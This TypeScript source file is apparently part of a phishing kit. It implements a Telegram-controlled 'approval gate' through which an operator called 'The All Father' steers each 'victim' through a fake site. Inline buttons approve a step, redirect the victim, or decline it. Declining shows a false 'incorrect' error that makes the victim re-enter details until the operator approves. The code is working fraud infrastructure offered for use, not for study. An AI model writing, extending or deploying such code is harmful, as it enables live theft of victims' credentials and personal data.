/**
 * Approval gate — lets The All Father control the victim's flow from Telegram.
 *
 * How it works (the "hook"):
 *  1. A step route handler creates an approval token (createApproval) and
 *     returns it to the client along with success.
 *  2. The Telegram notification is sent with an inline keyboard:
 *     [ ✅ Approve ]  [ ❌ Decline ]  [ 🌐 Redirect ]
 *  3. Each button carries a callback data string (`approve:<token>` etc.).
 *  4. When The All Father clicks a button, Telegram POSTs to
 *     /api/telegram/webhook → updateApproval(token, decision) +
 *     answers the callback (edits the message so clicked buttons show state).
 *  5. The victim's page polls GET /api/approval?token=... (the hook the
 *     server polls against) until a decision arrives:
 *       - approve  → advance to the next page
 *       - decline  → show an "incorrect" error; the form reopens so the info
 *                    can be entered again (repeats until approved)
 *       - redirect → hard-redirect to REDIRECT_TARGET_URL
 *
 * In-memory store is fine for a single Vercel/function instance; tokens are
 * one-time, TTL-bound, and expire on decision or timeout.
 */

import { randomBytes } from "node:crypto"

export type ApprovalDecision = "approve" | "decline" | "redirect"

export interface ApprovalState {
  token: string
  step: string
  /** null = still waiting on The All Father. */
  decision: ApprovalDecision | null
  createdAt: number
  decidedAt: number | null
  decidedBy?: string
}

const APPROVAL_TTL_MS = 10 * 60 * 1000
const approvals = new Map<string, ApprovalState>()

function prune() {
  const now = Date.now()
  for (const [key, value] of approvals) {
    if (now - value.createdAt > APPROVAL_TTL_MS) {
      approvals.delete(key)
    }
  }
}

export function createApproval(step: string): string {
  if (approvals.size > 500) prune()
  const token = randomBytes(16).toString("hex")
  approvals.set(token, {
    token,
    step,
    decision: null,
    createdAt: Date.now(),
    decidedAt: null,
  })
  return token
}

export function updateApproval(
  token: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): ApprovalState | null {
  const state = approvals.get(token)
  if (!state) return null
  if (!state.decision) {
    state.decision = decision
    state.decidedAt = Date.now()
    state.decidedBy = decidedBy
  }
  return state
}

export function getApproval(token: string): ApprovalState | null {
  const state = approvals.get(token)
  if (!state) return null
  if (Date.now() - state.createdAt > APPROVAL_TTL_MS) {
    approvals.delete(token)
    return null
  }
  return state
}

/** Public shape returned to the polling client. */
export function approvalView(token: string):
  | { status: "pending" }
  | { status: "decided"; decision: ApprovalDecision }
  | { status: "expired" } {
  const state = getApproval(token)
  if (!state) return { status: "expired" }
  if (!state.decision) return { status: "pending" }
  return { status: "decided", decision: state.decision }
}

/**
 * Resolve the most recent PENDING approval for a step (used by the local test
 * control panel, which doesn't track the token). Returns the token resolved,
 * or null if that step has no pending approval.
 */
export function resolveLatestPendingByStep(
  step: string,
  decision: ApprovalDecision,
  decidedBy?: string,
): string | null {
  if (approvals.size > 500) prune()
  let latestToken: string | null = null
  let latestAt = -1
  for (const state of approvals.values()) {
    if (state.step === step && !state.decision && state.createdAt > latestAt) {
      latestAt = state.createdAt
      latestToken = state.token
    }
  }
  if (!latestToken) return null
  updateApproval(latestToken, decision, decidedBy)
  return latestToken
}

export const APPROVAL_CALLBACK_PREFIXES = {
  approve: "approve:",
  decline: "decline:",
  redirect: "redirect:",
} as const

/** Parse a Telegram callback_data string into a decision + token. */
export function parseApprovalCallback(data: string): {
  decision: ApprovalDecision
  token: string
} | null {
  for (const [decision, prefix] of Object.entries(
    APPROVAL_CALLBACK_PREFIXES,
  ) as [ApprovalDecision, string][]) {
    if (data.startsWith(prefix)) {
      const token = data.slice(prefix.length)
      if (token) return { decision, token }
    }
  }
  return null
}
